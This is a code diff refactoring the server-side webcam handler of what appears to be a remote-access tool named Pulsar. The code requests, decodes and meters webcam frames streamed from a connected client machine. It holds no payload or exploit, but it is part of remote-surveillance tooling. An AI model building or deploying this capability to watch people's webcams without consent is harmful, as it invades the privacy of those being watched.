@@ -15,191 +15,112 @@ using System.Threading.Tasks;
 
 namespace Pulsar.Server.Messages
 {
-    /// <summary>
-    /// Handles messages for the interaction with the remote webcam.
-    /// </summary>
     public class RemoteWebcamHandler : MessageProcessorBase<Bitmap>, IDisposable
     {
-        /// <summary>
-        /// States if the client is currently streaming webcam frames.
-        /// </summary>
-        public bool IsStarted { get; set; }
-
-        /// <summary>
-        /// Gets or sets whether the remote webcam is using buffered mode.
-        /// </summary>
+        public bool IsStarted { get; private set; }
         public bool IsBufferedMode { get; set; } = true;
 
-        /// <summary>
-        /// Used in lock statements to synchronize access to <see cref="_codec"/> between UI thread and thread pool.
-        /// </summary>
-        private readonly object _syncLock = new object();
-
-        /// <summary>
-        /// Used in lock statements to synchronize access to <see cref="LocalResolution"/> between UI thread and thread pool.
-        /// </summary>
+        private readonly object _codecLock = new object();
         private readonly object _sizeLock = new object();
 
-        /// <summary>
-        /// The local resolution, see <seealso cref="LocalResolution"/>.
-        /// </summary>
         private Size _localResolution;
 
-        /// <summary>
-        /// The local resolution in width x height. It indicates to which resolution the received frame should be resized.
-        /// </summary>
-        /// <remarks>
-        /// This property is thread-safe.
-        /// </remarks>
         public Size LocalResolution
         {
-            get
-            {
-                lock (_sizeLock)
-                {
-                    return _localResolution;
-                }
-            }
-            set
-            {
-                lock (_sizeLock)
-                {
-                    _localResolution = value;
-                }
-            }
+            get { lock (_sizeLock) return _localResolution; }
+            set { lock (_sizeLock) _localResolution = value; }
         }
 
-        /// <summary>
-        /// Represents the method that will handle display changes.
-        /// </summary>
-        /// <param name="sender">The message processor which raised the event.</param>
-        /// <param name="value">All currently available displays.</param>
         public delegate void DisplaysChangedEventHandler(object sender, string[] value);
-
-        /// <summary>
-        /// Raised when a display changed.
-        /// </summary>
-        /// <remarks>
-        /// Handlers registered with this event will be invoked on the 
-        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
-        /// </remarks>
         public event DisplaysChangedEventHandler DisplaysChanged;
 
-        /// <summary>
-        /// Reports changed displays.
-        /// </summary>
-        /// <param name="value">All currently available displays.</param>
-        private void OnDisplaysChanged(string[] value)
+        private void OnDisplaysChanged(string[] webcams)
         {
-            SynchronizationContext.Post(val =>
+            SynchronizationContext.Post(o =>
             {
-                var handler = DisplaysChanged;
-                handler?.Invoke(this, (string[])val);
-            }, value);
+                DisplaysChanged?.Invoke(this, (string[])o);
+            }, webcams);
         }
 
-        /// <summary>
-        /// The client which is associated with this remote webcam handler.
-        /// </summary>
         private readonly Client _client;
-
-        /// <summary>
-        /// The video stream codec used to decode received frames.
-        /// </summary>
         private UnsafeStreamCodec _codec;
 
-        // buffer parameters
-        private readonly int _initialFramesRequested = 5; // request 5 frames initially
-        private readonly int _defaultFrameRequestBatch = 3; // request 3 frames at a time now on
+        private readonly int _initialFramesRequested = 5;
+        private readonly int _defaultFrameRequestBatch = 3;
+
         private int _pendingFrames = 0;
-        private readonly SemaphoreSlim _frameRequestSemaphore = new SemaphoreSlim(1, 1);
-        private readonly Stopwatch _frameReceiptStopwatch = new Stopwatch();        private readonly ConcurrentQueue<long> _frameTimestamps = new ConcurrentQueue<long>();
-        private readonly int _fpsCalculationWindow = 10; // calculate FPS based on last 10 frames
 
-        private readonly Stopwatch _performanceMonitor = new Stopwatch();
-        private int _framesReceived = 0;
+        private readonly SemaphoreSlim _requestLock = new SemaphoreSlim(1, 1);
+
+        private readonly Stopwatch _fpsTimer = new Stopwatch();
+        private int _fpsCounter = 0;
         private double _estimatedFps = 0;
+        private float _lastReportedFps = -1f;
 
-        private long _accumulatedFrameBytes = 0;
-        private int _frameBytesSamples = 0;
+        private readonly ConcurrentQueue<long> _timestamps = new ConcurrentQueue<long>();
+        private readonly int _fpsWindow = 10;
+
+        private long _accumFrameBytes = 0;
+        private int _frameByteSamples = 0;
+
         private long _lastFrameBytes = 0;
-
         public long LastFrameSizeBytes => Interlocked.Read(ref _lastFrameBytes);
+
         public double AverageFrameSizeBytes
         {
             get
             {
-                long total = Interlocked.Read(ref _accumulatedFrameBytes);
-                int count = Volatile.Read(ref _frameBytesSamples);
+                long total = Interlocked.Read(ref _accumFrameBytes);
+                int count = Volatile.Read(ref _frameByteSamples);
                 return count > 0 ? (double)total / count : 0.0;
             }
         }
 
-        /// <summary>
-        /// Stores the last FPS reported by the client.
-        /// </summary>
-        private float _lastReportedFps = -1f;
-
-        /// <summary>
-        /// Shows the last FPS reported by the client, or estimated FPS if not available.
-        /// </summary>
         public float CurrentFps => _lastReportedFps > 0 ? _lastReportedFps : (float)_estimatedFps;
 
-        /// <summary>
-        /// Initializes a new instance of the <see cref="RemoteWebcamHandler"/> class using the given client.
-        /// </summary>
-        /// <param name="client">The associated client.</param>
         public RemoteWebcamHandler(Client client) : base(true)
         {
             _client = client;
-            _performanceMonitor.Start();
+            _fpsTimer.Start();
         }
 
-        /// <inheritdoc />
-        public override bool CanExecute(IMessage message) => message is GetWebcamResponse || message is GetAvailableWebcamsResponse;
-
-        /// <inheritdoc />
-        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
-
-        /// <inheritdoc />
-        public override void Execute(ISender sender, IMessage message)
+        public override bool CanExecute(IMessage message)
         {
-            switch (message)
-            {
-                case GetWebcamResponse frame:
-                    Execute(sender, frame);
-                    break;
-                case GetAvailableWebcamsResponse m:
-                    Execute(sender, m);
-                    break;
-            }
+            return message is GetWebcamResponse || message is GetAvailableWebcamsResponse;
         }
 
-        private void ClearTimeStamps()
+        public override bool CanExecuteFrom(ISender sender)
         {
-            while (_frameTimestamps.TryDequeue(out _)) { }
+            return _client.Equals(sender);
         }
 
-        /// <summary>
-        /// Begins receiving frames from the client using the specified quality and display.
-        /// </summary>
-        /// <param name="quality">The quality of the remote webcam frames.</param>
-        /// <param name="display">The display to receive frames from.</param>
+        public override void Execute(ISender sender, IMessage msg)
+        {
+            if (msg is GetWebcamResponse)
+                Execute(sender, (GetWebcamResponse)msg);
+            else if (msg is GetAvailableWebcamsResponse)
+                Execute(sender, (GetAvailableWebcamsResponse)msg);
+        }
+
+        private void ResetTimestamps()
+        {
+            while (_timestamps.TryDequeue(out _)) { }
+        }
+
         public void BeginReceiveFrames(int quality, int display)
         {
-            lock (_syncLock)
+            lock (_codecLock)
             {
                 IsStarted = true;
+
                 _codec?.Dispose();
                 _codec = null;
 
-                // Reset buffering counters
                 _pendingFrames = _initialFramesRequested;
-                ClearTimeStamps();
-                _framesReceived = 0;
-                _frameReceiptStopwatch.Restart();
+                ResetTimestamps();
+                _fpsCounter = 0;
+                _fpsTimer.Restart();
 
-                // Start in buffered mode
                 _client.Send(new GetWebcam
                 {
                     CreateNew = true,
@@ -212,169 +133,152 @@ namespace Pulsar.Server.Messages
             }
         }
 
-        /// <summary>
-        /// Ends receiving frames from the client.
-        /// </summary>
         public void EndReceiveFrames()
         {
-            lock (_syncLock)
+            lock (_codecLock)
             {
                 IsStarted = false;
             }
 
-            Debug.WriteLine("Remote webcam session stopped");
-
+            Debug.WriteLine("Remote webcam session stopped.");
             _client.Send(new GetWebcam { Status = RemoteWebcamStatus.Stop });
         }
 
-        /// <summary>
-        /// Refreshes the available displays of the client.
-        /// </summary>
         public void RefreshDisplays()
         {
-            Debug.WriteLine("Refreshing displays");
             _client.Send(new GetAvailableWebcams());
-        }        private async void Execute(ISender client, GetWebcamResponse message)
+        }
+
+        private async void Execute(ISender sender, GetWebcamResponse msg)
         {
-            _framesReceived++;
+            _fpsCounter++;
 
-            // Capture client-reported FPS if available
-            if (message.FrameRate > 0)
+            if (msg.FrameRate > 0)
+                _lastReportedFps = msg.FrameRate;
+
+            if (_fpsTimer.ElapsedMilliseconds >= 1000)
             {
-                _lastReportedFps = message.FrameRate;
+                _estimatedFps = _fpsCounter / (_fpsTimer.ElapsedMilliseconds / 1000.0);
+                _fpsCounter = 0;
+                _fpsTimer.Restart();
             }
 
-            if (_performanceMonitor.ElapsedMilliseconds >= 1000)
-            {
-                _estimatedFps = _framesReceived / (_performanceMonitor.ElapsedMilliseconds / 1000.0);
-                Debug.WriteLine($"Client FPS: {_lastReportedFps:F1}, Estimated FPS: {_estimatedFps:F1}, Frames received: {_framesReceived}");
-                _framesReceived = 0;
-                _performanceMonitor.Restart();
-            }
-
-            lock (_syncLock)
+            lock (_codecLock)
             {
                 if (!IsStarted)
                     return;
 
-                if (_codec == null || _codec.ImageQuality != message.Quality || _codec.Monitor != message.Monitor || _codec.Resolution != message.Resolution)
+                bool codecMismatch =
+                    _codec == null ||
+                    _codec.ImageQuality != msg.Quality ||
+                    _codec.Monitor != msg.Monitor ||
+                    !_codec.Resolution.Equals(msg.Resolution);
+
+                if (codecMismatch)
                 {
                     _codec?.Dispose();
-                    _codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution);
+                    _codec = new UnsafeStreamCodec(msg.Quality, msg.Monitor, msg.Resolution);
                 }
 
-                if (message.Image != null)
+                if (msg.Image != null)
                 {
-                    long size = message.Image.LongLength;
+                    long size = msg.Image.LongLength;
                     Interlocked.Exchange(ref _lastFrameBytes, size);
-                    Interlocked.Add(ref _accumulatedFrameBytes, size);
-                    Interlocked.Increment(ref _frameBytesSamples);
+                    Interlocked.Add(ref _accumFrameBytes, size);
+                    Interlocked.Increment(ref _frameByteSamples);
                 }
 
-                using (var ms = new MemoryStream(message.Image))
+                try
                 {
-                    try
+                    using (var ms = new MemoryStream(msg.Image))
                     {
-                        var decoded = _codec.DecodeData(ms);
-                        if (decoded != null)
-                        {
-                            EnsureLocalResolutionInitialized(decoded.Size);
+                        var frame = _codec.DecodeData(ms);
 
-                            // PASS THE DECODED FRAME DIRECTLY TO UI
-                            OnReport(decoded); // do not clone or dispose decoded
+                        if (frame != null)
+                        {
+                            EnsureLocalResolution(frame.Size);
+                            OnReport(frame);
                         }
                     }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"Error decoding frame: {ex.Message}");
-                    }
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine("Frame decode error: " + ex.Message);
                 }
 
+                msg.Image = null;
 
-                message.Image = null;
-
-                long timestamp = message.Timestamp;
-                _frameTimestamps.Enqueue(timestamp);
-                while (_frameTimestamps.Count > _fpsCalculationWindow && _frameTimestamps.TryDequeue(out _)) { }
+                _timestamps.Enqueue(msg.Timestamp);
+                while (_timestamps.Count > _fpsWindow && _timestamps.TryDequeue(out _)) { }
 
                 Interlocked.Decrement(ref _pendingFrames);
             }
 
-            if (IsBufferedMode && (message.IsLastRequestedFrame || _pendingFrames <= 1))
+            if (IsBufferedMode && (msg.IsLastRequestedFrame || _pendingFrames <= 1))
             {
                 await RequestMoreFramesAsync();
             }
         }
 
-        private void EnsureLocalResolutionInitialized(Size fallbackSize)
+        private void EnsureLocalResolution(Size fallback)
         {
-            if (fallbackSize.Width <= 0 || fallbackSize.Height <= 0)
-            {
+            if (fallback.Width <= 0 || fallback.Height <= 0)
                 return;
-            }
 
-            var current = LocalResolution;
+            Size current = LocalResolution;
             if (current.Width <= 0 || current.Height <= 0)
-            {
-                LocalResolution = fallbackSize;
-            }
+                LocalResolution = fallback;
         }
 
         private async Task RequestMoreFramesAsync()
         {
-            if (!await _frameRequestSemaphore.WaitAsync(0))
+            if (!await _requestLock.WaitAsync(0))
                 return;
 
             try
             {
-                int batchSize = _defaultFrameRequestBatch;
+                int batch = _defaultFrameRequestBatch;
 
-                if (_estimatedFps > 25)
-                    batchSize = 5;
-                else if (_estimatedFps < 10)
-                    batchSize = 2;
+                if (_estimatedFps > 25) batch = 5;
+                if (_estimatedFps < 10) batch = 2;
 
-                Debug.WriteLine($"Requesting {batchSize} more frames");
-                Interlocked.Add(ref _pendingFrames, batchSize);
+                Interlocked.Add(ref _pendingFrames, batch);
 
                 _client.Send(new GetWebcam
                 {
                     CreateNew = false,
-                    Quality = _codec?.ImageQuality ?? 75,
-                    DisplayIndex = _codec?.Monitor ?? 0,
+                    Quality = _codec != null ? _codec.ImageQuality : 75,
+                    DisplayIndex = _codec != null ? _codec.Monitor : 0,
                     Status = RemoteWebcamStatus.Continue,
                     IsBufferedMode = true,
-                    FramesRequested = batchSize
+                    FramesRequested = batch
                 });
             }
             finally
             {
-                _frameRequestSemaphore.Release();
+                _requestLock.Release();
             }
         }
 
-        private void Execute(ISender client, GetAvailableWebcamsResponse message)
+        private void Execute(ISender sender, GetAvailableWebcamsResponse msg)
         {
-            OnDisplaysChanged(message.Webcams);
+            OnDisplaysChanged(msg.Webcams);
         }
 
-        /// <summary>
-        /// Disposes all managed and unmanaged resources associated with this message processor.
-        /// </summary>
         public void Dispose()
         {
             Dispose(true);
             GC.SuppressFinalize(this);
         }
 
-        protected virtual void Dispose(bool disposing)
+        protected virtual void Dispose(bool d)
         {
-            if (disposing)
+            if (d)
             {
-                lock (_syncLock)
+                lock (_codecLock)
                 {
                     _codec?.Dispose();
-                    _frameRequestSemaphore?.Dispose();
+                    _requestLock?.Dispose();
                     IsStarted = false;
                 }
             }
